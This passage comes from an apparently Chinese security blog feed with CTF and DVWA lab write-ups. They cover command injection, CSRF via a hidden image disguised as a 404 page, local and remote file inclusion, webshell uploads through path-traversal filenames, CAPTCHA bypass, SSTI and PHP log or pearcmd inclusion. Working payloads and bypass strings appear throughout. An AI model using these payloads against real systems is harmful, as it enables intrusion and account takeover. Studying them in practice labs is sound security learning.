<h2 id="Mediun"><a href="#Mediun" class="headerlink" title="Mediun"></a>Mediun</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>a,</span><br><span class="line">       <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">   <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br></pre></td></tr></table></figure>
<p>中等难度是利用str_replace函数来进行过滤这个函数我们在sql注入时也遇到过时将字符串中出现的黑名单字符串进行替换，这个函数中将数组的key也就是&amp;&amp;和;替换成了空但是还有其他连接符没有进行过滤我们可以使用|来进行连接</p>
<h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><p>高难度我们查看一下源码可以发现<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;| &#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;-&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;$&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;(&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;)&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;`&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br></pre></td></tr></table></figure><br>几乎把连接符过滤了，但是我们仔细看看会发现其是将’| ‘变为空所以我可以直接使用<code>127.0.0.1|dir</code></p>
<h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><p>这关我们查看源码来学习一下<br><img src="/2024/01/01/DVWA%E7%9A%84wp/2-1.png" class="" title="Alt text"><br>我们可以看到其利用了expload()函数将由点分割的字符串保存为数组，在利用is_number()来检测其是否为数字，并且该数数组大小为4。由于我们在最后接上了指令导致其最后一个不为数字，无法进行注入</p>
<h1 id="DVMA-CSRF"><a href="#DVMA-CSRF" class="headerlink" title="DVMA-CSRF"></a>DVMA-CSRF</h1><h2 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h2><p>这个LOW难度我们查看源码可以发现只有两次秘密相同就可以成功修改密码没有进行任何过滤并且其密码是使用GET传值，我们尝试修改一下密码，得到url为<code>http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=2&amp;password_conf=2&amp;Change=Change#</code>这时候我们将其进行修改<code>http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=3333&amp;password_conf=3333&amp;Change=Change#</code>之后再其他网页访问发现，成功将密码修改为了3333但是这种方法属实是有点傻，这时候我们有以下两种方法进行修改</p>
<h2 id="1。短链"><a href="#1。短链" class="headerlink" title="1。短链"></a>1。短链</h2><p>我们可以使用短链生成工具的在线网站将该链接进行转换。</p>
<h2 id="2："><a href="#2：" class="headerlink" title="2："></a>2：</h2><p>我们可以使用如下html文件将html文件放在web里，这时候网页会自动发送请求。该方法更加隐蔽也常用代码如下<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=3333&amp;password_conf=3333&amp;Change=Change#&quot;</span><span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">    404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">           file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这时候我们访问该网站会显示404这回使用户误认为访问错误了，但是其实密码已经被修改了。<br><img src="/2024/01/01/DVWA%E7%9A%84wp/2.png" class="" title="Alt text"></p>
<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><img src="/2024/01/01/DVWA%E7%9A%84wp/3.png" class="" title="Alt text">
<p>我们查看代码发现比LOW多了个<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> )</span><br></pre></td></tr></table></figure><br>这个代码的作用使匹配我们发送的referer头查看是否为服务器名称，如果referer里含有服务器名称则修改密码。<br>这时候我们可以直接将html文件改为主机名称。这样子再发送时referer头就回包含主机名称</p>
<h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><p>high难度的因为其需要运用到xss的内容再学习网xss后再补充。</p>
<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>该大关主要是考察文件包含漏洞<br>文件包含漏洞的具体可以查看这篇博客<a href="https://blog.csdn.net/m0_46467017/article/details/126380415?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170445517316800222874316%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170445517316800222874316&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-126380415-null-null.142^v99^pc_search_result_base2&amp;utm_term=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1018.2226.3001.4187">文件包含漏洞</a></p>
<h2 id="LOW-2"><a href="#LOW-2" class="headerlink" title="LOW"></a>LOW</h2><p>这一关我们查看源码可以发现没有任何过滤，这导致我们可以直接使用文件包含漏洞。<br>比如：<br>本地包含漏洞：<code>http://192.168.32.1/DVWA-master/vulnerabilities/fi/?page=C:Windows/system.ini</code>如果该页面文件位于c盘可以改为改为…...\Windows\system.ini<br>远程包含漏洞：<code>http://192.168.32.1/DVWA-master/vulnerabilities/fi/?page=https://lisien11.github.io/404.html</code>这样就会包含我博客的404页面内容<br>也可以使用php伪协议来输出index.php内容：<code>http://192.168.32.1/DVWA-master/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php</code></p>
<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>打开源码发现过滤了<code>http://和https://</code>但是由于其过滤的函数为str_replace()这个函数我们再sql注入时见过只要使用双写就可以绕过如：<code>http://192.168.32.1/DVWA-master/vulnerabilities/fi/?page=htthttps://ps://lisien11.github.io/404.html</code></p>
<h2 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h2><p>我们打开源码发现其要求文件的开头必须要为file或者文件名为include.php<br>所以我们可以使用<code>file://</code>伪协议来绕过</p>
<h2 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h2><p>由于源码的过滤是直接指定可包含文件的名字，所以无法使用文件包含漏洞。</p>
<h1 id="File-upload"><a href="#File-upload" class="headerlink" title="File upload"></a>File upload</h1><h2 id="LOW-3"><a href="#LOW-3" class="headerlink" title="LOW"></a>LOW</h2><p>直接上传一句话木马，蚁剑链接即可</p>
<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><p>因为其检查是考MIME所以直接上传抓包修改后缀为php</p>
<h2 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h2><p>直接上传图片马使用文件包含漏洞即可</p>
<h2 id="impossible-3"><a href="#impossible-3" class="headerlink" title="impossible"></a>impossible</h2><p>该代码将文件名字做了随机处理，并且只能上传jpg和png，而该代码会对图片进行压缩导致其二进制编码发生改变，虽然gif可以保留一点但是由于无法上传gif所以非常安全</p>
<h1 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h1><h2 id="LOW-4"><a href="#LOW-4" class="headerlink" title="LOW"></a>LOW</h2><p>这关的主要目的是绕过验证码来对密码进行修改，我们查看源码发现step为1时进行验证码验证，step为2时直接进行密码修改的程序所以我们直接抓包将step改为2即可</p>
<h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><p>我们查看源码发现其就比LOW多了一段<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( !<span class="variable">$_POST</span>[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123;</span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>我们要绕过这个需要抓包传passed_captcha的值为ture</p>
<h2 id="high-5"><a href="#high-5" class="headerlink" title="high"></a>high</h2><p>我们查看源码可以发现<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$resp</span> || (<span class="variable">$_POST</span>[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span>&amp;&amp; <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span>))</span><br></pre></td></tr></table></figure><br>我们需要绕过以上代码<br>可以发现我们可以将g-recaptcha-response的值传为hidd3n_valu3将HTTP_USER_AGENT的值传为reCAPTCHA就可以绕过</p>
<h1 id="impossible-4"><a href="#impossible-4" class="headerlink" title="impossible"></a>impossible</h1><p>要求输入原密码。</p>
<h1 id="weak-session-id"><a href="#weak-session-id" class="headerlink" title="weak session id"></a>weak session id</h1><h1 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接将session从0不断加1生成</p>
<h1 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br></pre></td></tr></table></figure>
<p>将时间戳设置为session，时间戳是不安全的</p>
<h1 id="high-6"><a href="#high-6" class="headerlink" title="high"></a>high</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>setcookie(name,value,expire,path,domain,secure,httponly)</p>
<p>name 必需。规定cookie的名称。<br>value 必需。规定cookie的值。<br>expire 可选。规定cookie的有效期。<br>path 可选。规定cookie的服务器路径。<br>domain 可选。规定cookie的域名。<br>secure 可选。规定是否通过安全的HTTPS连接来传cookie。<br>httponly 可选。规定是否Cookie仅可通过HTTP协议访问。</p>
<p>将session从0不断加1或进行md5加密进行设置，仍然具有规律性还是很不安全</p>
<h1 id="impossible-5"><a href="#impossible-5" class="headerlink" title="impossible"></a>impossible</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">mt_rand</span>() . <span class="title function_ invoke__">time</span>() . <span class="string">&quot;Impossible&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将session设置随机数加时机戳加上”Impossible”最后利用sha1进行加密非常的安全啊。</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>top10</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>FCTF的wp</title>
    <url>/2024/04/06/FCTF%E7%9A%84wp/</url>
    <content><![CDATA[<h1 id="这个清明闲着没事和队友偷偷跑去打福州大学的线上校赛。整体下来打的还是很开心的。福大的师傅人很好，发现我们是校外的也就只是让我们换个号打，不要交flag，整体下来题目对web手来说还是比较友好的，对PWN手可能就不太友好了。还是能学到不少的下面是wp"><a href="#这个清明闲着没事和队友偷偷跑去打福州大学的线上校赛。整体下来打的还是很开心的。福大的师傅人很好，发现我们是校外的也就只是让我们换个号打，不要交flag，整体下来题目对web手来说还是比较友好的，对PWN手可能就不太友好了。还是能学到不少的下面是wp" class="headerlink" title="这个清明闲着没事和队友偷偷跑去打福州大学的线上校赛。整体下来打的还是很开心的。福大的师傅人很好，发现我们是校外的也就只是让我们换个号打，不要交flag，整体下来题目对web手来说还是比较友好的，对PWN手可能就不太友好了。还是能学到不少的下面是wp"></a>这个清明闲着没事和队友偷偷跑去打福州大学的线上校赛。整体下来打的还是很开心的。福大的师傅人很好，发现我们是校外的也就只是让我们换个号打，不要交flag，整体下来题目对web手来说还是比较友好的，对PWN手可能就不太友好了。还是能学到不少的下面是wp</h1><h2 id="ping一下"><a href="#ping一下" class="headerlink" title="ping一下~"></a>ping一下~</h2><p>签到题没什么好说的直接管道符加命令执行就可以了。</p>
<h2 id="被你们玩坏了的ping"><a href="#被你们玩坏了的ping" class="headerlink" title="被你们玩坏了的ping"></a>被你们玩坏了的ping</h2><p>和上一题相比只是没有回显而已，一开始我准备弹shell后面发现弹不了就直接DNS外带了。</p>
<h2 id="吃掉小土豆"><a href="#吃掉小土豆" class="headerlink" title="吃掉小土豆"></a>吃掉小土豆</h2><p>福大的题目都是有给源码的，如果题目没有给哪个代审的工具网站那么难度是有的，但是给了，用工具可以一眼看出是sql注入，注入点是<code>$_session[name]</code><br><br><br>而session是在rank.php下直接GET传值的。在简单的手测后发现位报错注入</p>
<h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can_u_find_me?"></a>can_u_find_me?</h2><p>我们查看一下源码会发现404窗口的报错页面位模板注入。<br><br><br>我们看一下waf<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> s.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> s + <span class="string">&#x27;?hacker&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(s)</span><br></pre></td></tr></table></figure><br>这个waf检测的最后一个/那么我们只要在url后加上<code>url/&#123;&#123;7*7&#125;&#125;/</code><br>这样就可以绕过这个waf了剩下的就是普通的ssti了</p>
<h2 id="Potato-Netdisk"><a href="#Potato-Netdisk" class="headerlink" title="Potato_Netdisk"></a>Potato_Netdisk</h2><p>网盘这两题给我笑啦了。全都可以非预期。最主要的是非预期的原因是少了个括号。难绷。但是后来在我的反馈下把这个非预期给修了。这里贴一下出题人看到这个非预期后的反应。<br><br><br>保护出题人隐私手动打个码，嘿嘿。<br>好了要正经写wp了<br>首先看源码会发现其将我们的照片上传到了预设定的路径，那么我们的思路就是将文件上传到web目录下。我们先上传一个名位../的来看看waf的反应。其回显如下<br><br>可以发现其物理路径发生了泄露，那么这时我们能想到如果可以进行拼接构造出/tmp/upload/../../var/www/html/1.php不就可以把1.php传到html目录下了吗?<br>但是我们看源码会发现其都设了waf我们无法直接上传这个文件名进行拼接<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateFilePath</span>(<span class="params"><span class="variable">$path</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">str_contains</span>(<span class="variable">$path</span>,<span class="string">&#x27;..&#x27;</span>.DIRECTORY_SEPARATOR) || <span class="title function_ invoke__">str_contains</span>(<span class="variable">$path</span>,<span class="string">&#x27;/var/www/html&#x27;</span>)))&#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非法上传路径！&quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们继续进行代码审计查看一下文件夹上传的代码<br>在文件夹上传的源码里可以发现如下代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">normalizeFilePath</span>(<span class="params"><span class="variable">$path</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>], <span class="string">&#x27;Windows&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以发现其将<code>\</code>转换成了/那么我们就有点想法了，可以将所有的/变为<code>\</code>来尝试上传。如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..\\..\\var\\www\\html\\lalalala.php</span><br></pre></td></tr></table></figure><br>会发现上传成功。接下来就是蚁剑连马了。</p>
<h2 id="Potato-Netdisk-v2-0"><a href="#Potato-Netdisk-v2-0" class="headerlink" title="Potato_Netdisk_v2.0"></a>Potato_Netdisk_v2.0</h2><p>这题和上一题区别不大，唯一的区别就是会删马和waf更强一点<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateFilePath</span>(<span class="params"><span class="variable">$path</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">str_contains</span>(<span class="variable">$path</span>,<span class="string">&#x27;..&#x27;</span>.DIRECTORY_SEPARATOR) || <span class="title function_ invoke__">str_contains</span>(<span class="variable">$path</span>,<span class="string">&#x27;/var.www.html&#x27;</span>)))&#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非法上传路径！&quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在简单手测后发现无法使用上一题的paylaod进行上传。<br>可是这个问题也不大。我们进行简单的修改进行尝试<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..\\..\\var\\www\\..\\www\\html\\lalalala.php</span><br></pre></td></tr></table></figure><br>我们在其中添加一个..\\来对其进行中断就可以成功上传拉。</p>
<h2 id="ROIIS-blog"><a href="#ROIIS-blog" class="headerlink" title="ROIIS_blog"></a>ROIIS_blog</h2><p>哈哈又是一个cve。这题的cve还后并没有对源码进行修改，我们只要按照网上的步骤来打即可。<br>打开网站<br>点击功能的文章发现其直接泄露了框架的版本<br><br>框架名为WordPress。版本为4.6很老的版本了连cve都是16年的。这里我就不再写一遍了。出了配置vps会麻烦一点其他都很简单。</p>
<h2 id="ezzzzzzzzz-PTA"><a href="#ezzzzzzzzz-PTA" class="headerlink" title="ezzzzzzzzz_PTA"></a>ezzzzzzzzz_PTA</h2><p>感觉出题人有点懒了也可能是出题人只有一个的原因没办法搓出太多题。导致很多题都是一个简单版一个加强版。<br>这题就是一个简单的沙箱绕过，其禁了import os和<strong>import</strong>而且我再使用网上的一些绕过payload的时候会报错，感觉是环境的原因。我写这题用的是其自带的shell类来进行写，步骤和我以前学的ssti很相似<br><br>payload如上就不展开细说了。</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker PHP裸文件本地包含</title>
    <url>/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="我发现自己的越来越内耗了。不知道为什么最近都没有写博客的动力了。但是还是要写博客来记录一下这个漏洞。"><a href="#我发现自己的越来越内耗了。不知道为什么最近都没有写博客的动力了。但是还是要写博客来记录一下这个漏洞。" class="headerlink" title="我发现自己的越来越内耗了。不知道为什么最近都没有写博客的动力了。但是还是要写博客来记录一下这个漏洞。"></a>我发现自己的越来越内耗了。不知道为什么最近都没有写博客的动力了。但是还是要写博客来记录一下这个漏洞。</h1><p>这个漏洞是我在无聊写题时遇到的漏洞。文章学习与p牛的博客<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述</a></p>
<h1 id="日志文件包含-不行但我还是要写一下"><a href="#日志文件包含-不行但我还是要写一下" class="headerlink" title="日志文件包含(不行但我还是要写一下)"></a>日志文件包含(不行但我还是要写一下)</h1><p>首先我们都知道服务器一般都会有日志文件，我们传入的内容都会被日志文件给记录<br>nginx的默认日志位置如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_log /var/log/nginx/error.log;</span><br><span class="line">access_log /var/log/nginx/access.log;</span><br></pre></td></tr></table></figure><br>web的access_log日志下会存储访问的ua头等<br>那只要在ua头写马在包含就可以得到shell<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/2.png" class="" title="alt text"><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/1.png" class="" title="alt text"></p>
<h1 id="pearcmd-php"><a href="#pearcmd-php" class="headerlink" title="pearcmd.php"></a>pearcmd.php</h1><p>利用条件<br>php.ini中register_argc_argv=On开启<br>安装pecl/pear</p>
<p>pear这个工具在php7.3前会自动安装但是到了php7.4后就不会自动安装。<br>但是在docker中这个工具是默认安装的，这个工具其实就是个命令行工具，可以使用其来对文件进行操作。<br>pearcmd.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">PEAR_Command</span>::<span class="title function_ invoke__">setFrontendType</span>(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line"><span class="variable">$all_commands</span> = <span class="title class_">PEAR_Command</span>::<span class="title function_ invoke__">getCommands</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$argv</span> = <span class="title class_">Console_Getopt</span>::<span class="title function_ invoke__">readPHPArgv</span>();</span><br><span class="line"><span class="comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">php_sapi_name</span>() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) &amp;&amp; <span class="variable">$argv</span>[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$argv</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$argv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们来查看该源码会发现其<code>$argv</code>是由<code>Console_Getopt::readPHPArgv();</code>来决定的<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::<span class="title function_ invoke__">raiseError</span>(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>我们会发现其<code>$argv</code>是由<code>$_SERVER[&#39;argv&#39;]</code>来决定的。而当开启了register_argc_argv时php会将get传参的?后的所以传入$_SERVER[‘argv’]根据空格分隔成argv[0],argv[1]…..</p>
